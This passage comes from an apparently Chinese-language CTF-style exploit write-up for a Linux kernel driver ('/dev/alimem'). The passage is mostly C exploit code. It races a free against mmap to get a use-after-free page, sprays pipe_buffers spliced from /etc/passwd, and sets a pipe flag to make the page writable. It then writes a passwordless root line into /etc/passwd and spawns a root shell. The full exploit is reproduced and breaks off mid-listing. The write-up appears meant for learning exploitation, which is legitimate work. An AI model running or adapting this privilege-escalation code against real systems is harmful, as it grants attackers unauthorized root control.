class="line">        perror(<span class="string">&quot;write error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	对于wirte_pattern就是利用ioctl的write进行写，这里为了方便就是都覆盖为PATTERN也就是0xAA，这样后面再进行读取的时候直接check_zero，如果页面全为0了就说明这个页面已经被释放了。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">int</span> idx, attempt = <span class="number">0</span>;</span><br><span class="line">    <span class="type">pthread_t</span> tid;</span><br><span class="line">    </span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)&#123;</span><br><span class="line">    <span class="keyword">if</span>(pipe(pipe_fd[i]) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;pipe&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> ((fd = open(DEV_PATH, O_RDWR)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">    perror(<span class="string">&quot;device open failed&quot;</span>);</span><br><span class="line">    <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;[+] Start to trigger racing bug.../n&quot;</span>);</span><br><span class="line"><span class="keyword">while</span> (!<span class="type">atomic_load</span>(&amp;uaf_detected) &amp;&amp; attempt++ &lt; MAX_ATTEMPTS) &#123;</span><br><span class="line">    idx = ioctl(fd, ALIMEM_ALLOC);</span><br><span class="line">    <span class="keyword">if</span> (idx &lt; <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">    write_pattern(idx);</span><br><span class="line">    </span><br><span class="line">    pthread_create(&amp;tid, <span class="literal">NULL</span>, mapper_thread, &amp;idx);</span><br><span class="line">    usleep(<span class="number">50</span>); <span class="comment">// 精确控制竞争窗⼝</span></span><br><span class="line">    ioctl(fd, ALIMEM_FREE, &amp;idx);</span><br><span class="line">    </span><br><span class="line">    pthread_join(tid, <span class="literal">NULL</span>);</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> (attempt) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;[+] try %d times.../r&quot;</span>, attempt);</span><br><span class="line">        fflush(<span class="built_in">stdout</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="type">atomic_load</span>(&amp;uaf_detected)) &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;/n[+] UAF detected, try times: %d/n&quot;</span>, attempt);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;/n[-] UAF detected error/n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	之后就是对于整个攻击流程的讲解，这里首先就是利用了pipe创建一定数目的pipe_buffer，提前创建防止后面alloc之后产生噪声，之后就是打开驱动文件，之后利用atomic_load原子操作来读取uaf_detected变量，主要是识别是否已经出现uaf的页面了，不断进行尝试，free以及mmap，这样如果出现之前所说的在mmap获取引用和refcount自增之前free掉了这个页面就可以获得到一个UAF的页面，可以进行下一步的攻击。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">4</span> * <span class="number">0x1000</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;fcntl&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> target_fd = open(<span class="string">&quot;/etc/passwd&quot;</span>, O_RDONLY);</span><br><span class="line"><span class="keyword">if</span>(target_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">    perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">    <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)&#123;</span><br><span class="line">    <span class="type">loff_t</span> offset = i;</span><br><span class="line">    <span class="type">ssize_t</span> nbytes = splice(target_fd, &amp;offset, pipe_fd[i][<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">    <span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;splice failed&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>​	之后就是利用fcntl对于pipe_buffer实现修改大小，将其修改成4k也就是一个页面的大小，这样就有概率申请到我们之前释放掉的page页面，然后就是通过只读的方式读取&#x2F;etc&#x2F;passwd，利用循环给&#x2F;etc&#x2F;passwd和之前申请的管道创建splice，方便后面我们直接通过管道就可以修改&#x2F;etc&#x2F;passwd文件的内容。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *ptr = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> found = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ((ptr = memmem(addr, <span class="number">0x1000</span>, <span class="string">&quot;/xff/xff&quot;</span>, <span class="number">2</span>))) &#123;</span><br><span class="line">        hexdump(ptr - <span class="number">6</span>, <span class="number">0x40</span>);</span><br><span class="line">        found = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (found) &#123;</span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">pp</span> =</span> (<span class="keyword">struct</span> pipe_buffer *)(ptr - <span class="number">6</span>);</span><br><span class="line">    pp-&gt;len = <span class="number">0</span>;</span><br><span class="line">    pp-&gt;offset = <span class="number">0</span>;</span><br><span class="line">    pp-&gt;flags |= <span class="number">0x10</span>;</span><br><span class="line">    hexdump(ptr - <span class="number">6</span>, <span class="number">0x40</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;/n[-] UAF pipe_buffer error/n&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="/./images/alimem/1741173753507.jpg" alt="1741173753507">	</p>
<p>​	利用memmem函数就是找0x1000长度我们之前获得到的uaf页面中找到第一个出现两个字节”&#x2F;xff&#x2F;xff”的位置，这里其实就是找到pipe_buffer结构的第一个指针<strong>page</strong>指针，找到之后减去6就是我们再uaf中写入的pipe_buffer结构体的指针，之后我们将其重新设置长度偏移和flags，也就是让他变的可写。</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">char</span> *r00t = <span class="string">&quot;root::0:0:root:/root:/bin/sh/n&quot;</span>;</span><br><span class="line"><span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++) &#123;</span><br><span class="line">    <span class="keyword">if</span> (write(pipe_fd[i][<span class="number">1</span>], r00t, <span class="built_in">strlen</span>(r00t)) &gt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">continue</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br></pre></td></tr></table></figure>

<p>​	最后就是利用写pipe管道向&#x2F;etc&#x2F;passwd的第一行进行覆盖，使得root用户可以不用密码就可以登录。<br>​	最终的exp如下：</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> _GNU_SOURCE</span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;assert.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;err.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;errno.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/genetlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/kcmp.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/pkt_cls.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/pkt_sched.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/rtnetlink.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;linux/tc_ematch/tc_em_meta.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;pthread.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdarg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdbool.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdint.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdlib.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;string.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/mman.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/resource.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/socket.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/stat.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/uio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;syscall.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/msg.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;sys/ioctl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;stdatomic.h&gt;</span></span></span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PAGE_SIZE 4096</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> DEV_PATH <span class="string">&quot;/dev/alimem&quot;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PATTERN 0xAA</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> MAX_ATTEMPTS 100000</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALIMEM_ALLOC 0x1337</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALIMEM_FREE 0x1338</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALIMEM_WRITE 0x1339</span></span><br><span class="line"><span class="meta">#<span class="keyword">define</span> ALIMEM_READ 0x133a</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alimem_write</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset;</span><br><span class="line">    <span class="type">const</span> <span class="type">char</span> *data;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">alimem_read</span> &#123;</span></span><br><span class="line">    <span class="type">int</span> idx;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset;</span><br><span class="line">    <span class="type">char</span> *data;</span><br><span class="line">    <span class="type">size_t</span> size;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">page</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_inode_info</span>;</span></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span>;</span></span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> &#123;</span></span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">page</span> *<span class="title">page</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> offset, len;</span><br><span class="line">    <span class="type">const</span> <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buf_operations</span> *<span class="title">ops</span>;</span></span><br><span class="line">    <span class="type">unsigned</span> <span class="type">int</span> flags;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">long</span> private;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> fd;</span><br><span class="line"><span class="type">void</span> *addr;</span><br><span class="line"><span class="meta">#<span class="keyword">define</span> PIPE_NUM 400</span></span><br><span class="line"><span class="type">int</span> pipe_fd[<span class="number">400</span>][<span class="number">2</span>];</span><br><span class="line"><span class="type">atomic_int</span> uaf_detected = <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">hexdump</span><span class="params">(<span class="type">void</span> *addr, <span class="type">size_t</span> len)</span> &#123;</span><br><span class="line">    <span class="type">unsigned</span> <span class="type">char</span> *p = (<span class="type">unsigned</span> <span class="type">char</span>*)addr;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; len; i++) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;%02X &quot;</span>, p[i]);</span><br><span class="line">        <span class="keyword">if</span> ((i + <span class="number">1</span>) % <span class="number">16</span> == <span class="number">0</span>) <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">write_pattern</span><span class="params">(<span class="type">int</span> idx)</span> &#123;</span><br><span class="line">    <span class="type">char</span> buf[PAGE_SIZE];</span><br><span class="line">    <span class="built_in">memset</span>(buf, PATTERN, <span class="keyword">sizeof</span>(buf));</span><br><span class="line">    </span><br><span class="line">    <span class="class"><span class="keyword">struct</span> <span class="title">alimem_write</span> <span class="title">wr</span> =</span> &#123;</span><br><span class="line">        .idx = idx,</span><br><span class="line">        .offset = <span class="number">0</span>,</span><br><span class="line">        .data = buf,</span><br><span class="line">        .size = <span class="keyword">sizeof</span>(buf)</span><br><span class="line">    &#125;;</span><br><span class="line">    <span class="keyword">if</span> (ioctl(fd, ALIMEM_WRITE, &amp;wr) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;write error&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span> <span class="title function_">check_zero</span><span class="params">(<span class="type">void</span> *addr)</span> &#123;</span><br><span class="line">    <span class="type">char</span> *p = (<span class="type">char</span>*)addr;</span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PAGE_SIZE; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span> (p[i] != <span class="number">0</span>) <span class="keyword">return</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="type">atomic_store</span>(&amp;uaf_detected, <span class="number">1</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">void</span>* <span class="title function_">mapper_thread</span><span class="params">(<span class="type">void</span> *arg)</span> &#123;</span><br><span class="line">    <span class="type">int</span> idx = *(<span class="type">int</span>*)arg;</span><br><span class="line">    addr = mmap(<span class="literal">NULL</span>, PAGE_SIZE, PROT_READ | PROT_WRITE, MAP_SHARED, fd, idx * PAGE_SIZE);</span><br><span class="line">    usleep(<span class="number">500</span>);</span><br><span class="line">    <span class="keyword">if</span> (addr != MAP_FAILED) &#123;</span><br><span class="line">        usleep(<span class="number">50000</span>);</span><br><span class="line">        check_zero(addr);</span><br><span class="line">        <span class="keyword">if</span>(!uaf_detected)</span><br><span class="line">            munmap(addr, PAGE_SIZE);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">NULL</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span> &#123;</span><br><span class="line">    <span class="type">int</span> idx, attempt = <span class="number">0</span>;</span><br><span class="line">    <span class="type">pthread_t</span> tid;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)&#123;</span><br><span class="line">        <span class="keyword">if</span>(pipe(pipe_fd[i]) &lt; <span class="number">0</span>)&#123;</span><br><span class="line">            perror(<span class="string">&quot;pipe&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">if</span> ((fd = open(DEV_PATH, O_RDWR)) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        perror(<span class="string">&quot;device open failed&quot;</span>);</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;[+] Start to trigger racing bug...\n&quot;</span>);</span><br><span class="line">    <span class="keyword">while</span> (!<span class="type">atomic_load</span>(&amp;uaf_detected) &amp;&amp; attempt++ &lt; MAX_ATTEMPTS) &#123;</span><br><span class="line">        idx = ioctl(fd, ALIMEM_ALLOC);</span><br><span class="line">        <span class="keyword">if</span> (idx &lt; <span class="number">0</span>) <span class="keyword">continue</span>;</span><br><span class="line">        write_pattern(idx);</span><br><span class="line">        </span><br><span class="line">        pthread_create(&amp;tid, <span class="literal">NULL</span>, mapper_thread, &amp;idx);</span><br><span class="line">        usleep(<span class="number">50</span>); <span class="comment">// 精确控制竞争窗⼝</span></span><br><span class="line">        ioctl(fd, ALIMEM_FREE, &amp;idx);</span><br><span class="line">        </span><br><span class="line">        pthread_join(tid, <span class="literal">NULL</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> (attempt) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;[+] try %d times...\r&quot;</span>, attempt);</span><br><span class="line">            fflush(<span class="built_in">stdout</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (<span class="type">atomic_load</span>(&amp;uaf_detected)) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n[+] UAF detected, try times: %d\n&quot;</span>, attempt);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n[-] UAF detected error\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span> (<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++) &#123;</span><br><span class="line">        <span class="keyword">if</span>(fcntl(pipe_fd[i][<span class="number">1</span>], F_SETPIPE_SZ, <span class="number">4</span> * <span class="number">0x1000</span>) &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;fcntl&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">int</span> target_fd = open(<span class="string">&quot;/etc/passwd&quot;</span>, O_RDONLY);</span><br><span class="line">    <span class="keyword">if</span>(target_fd &lt; <span class="number">0</span>)&#123;</span><br><span class="line">        perror(<span class="string">&quot;open&quot;</span>);</span><br><span class="line">        <span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">for</span>(<span class="type">int</span> i = <span class="number">0</span>; i &lt; PIPE_NUM; i++)&#123;</span><br><span class="line">        <span class="type">loff_t</span> offset = i;</span><br><span class="line">        <span class="type">ssize_t</span> nbytes = splice(target_fd, &amp;offset, pipe_fd[i][<span class="number">1</span>], <span class="literal">NULL</span>, <span class="number">1</span>, <span class="number">0</span>);</span><br><span class="line">        <span class="keyword">if</span> (nbytes &lt; <span class="number">0</span>) &#123;</span><br><span class="line">            perror(<span class="string">&quot;splice failed&quot;</span>);</span><br><span class="line">            <span class="keyword">return</span> EXIT_FAILURE;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *ptr = <span class="number">0</span>;</span><br><span class="line">    <span class="type">int</span> found = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">if</span> ((ptr = memmem(addr, <span class="number">0x1000</span>, <span class="string">&quot;\xff\xff&quot;</span>, <span class="number">2</span>))) &#123;</span><br><span class="line">        hexdump(ptr - <span class="number">6</span>, <span class="number">0x40</span>);</span><br><span class="line">        found = <span class="number">1</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (found) &#123;</span><br><span class="line">        <span class="class"><span class="keyword">struct</span> <span class="title">pipe_buffer</span> *<span class="title">pp</span> =</span> (<span class="keyword">struct</span> pipe_buffer *)(ptr - <span class="number">6</span>);</span><br><span class="line">        pp-&gt;len = <span class="number">0</span>;</span><br><span class="line">        pp-&gt;offset = <span class="number">0</span>;</span><br><span class="line">        pp-&gt;flags |= <span class="number">0x10</span>;</span><br><span class="line">        hexdump(ptr - <span class="number">6</span>, <span class="number">0x40</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\n[-] UAF pipe_buffer error\n&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="type">char</span> *r00t = <span class="string">&quot;root::0:0:root:/root:/bin/sh\n&quot;</span>;</span><br><span class="line">    <span 